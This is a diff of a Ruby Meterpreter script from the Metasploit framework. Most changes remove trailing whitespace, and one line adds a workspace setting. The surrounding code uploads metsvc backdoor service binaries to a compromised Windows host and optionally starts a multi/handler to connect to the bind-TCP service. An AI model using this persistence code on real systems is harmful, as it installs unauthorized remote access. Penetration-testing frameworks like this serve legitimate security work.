@@ -22,7 +22,7 @@ def m_exec(session, cmd)
 	while(d = r.channel.read)
 		b << d
 	end
-	r.channel.close			
+	r.channel.close
 	r.close
 	b
 end
@@ -49,7 +49,7 @@ opts.parse(args) do |opt, idx, val|
 	when "-A"
 		autoconn = true
 	when "-r"
-		remove = true		
+		remove = true
 	end
 end
 
@@ -74,7 +74,7 @@ client.fs.dir.mkdir(tempdir)
 
 %W{ metsrv.dll metsvc-server.exe metsvc.exe }.each do |bin|
 	next if (bin != "metsvc.exe" and remove)
-	print_status(" >> Uploading #{bin}...")	
+	print_status(" >> Uploading #{bin}...")
 	fd = client.fs.file.new(tempdir + "\\" + bin, "wb")
 	fd.write(::File.read(File.join(based, bin), ::File.size(::File.join(based, bin))))
 	fd.close
@@ -105,14 +105,14 @@ end
 if(autoconn)
 	print_status("Trying to connect to the Meterpreter service at #{client.tunnel_peer.split(':')[0]}:#{rport}...")
 	mul = client.framework.exploits.create("multi/handler")
+	mul.datastore['WORKSPACE'] = client.workspace
 	mul.datastore['PAYLOAD'] = "windows/metsvc_bind_tcp"
 	mul.datastore['LPORT']   = rport
 	mul.datastore['RHOST']   = client.tunnel_peer.split(':')[0]
-	mul.datastore['ExitOnSession'] = false	
+	mul.datastore['ExitOnSession'] = false
 	mul.exploit_simple(
 		'Payload'        => mul.datastore['PAYLOAD'],
 		'RunAsJob'       => true
 	)
 end
-
 
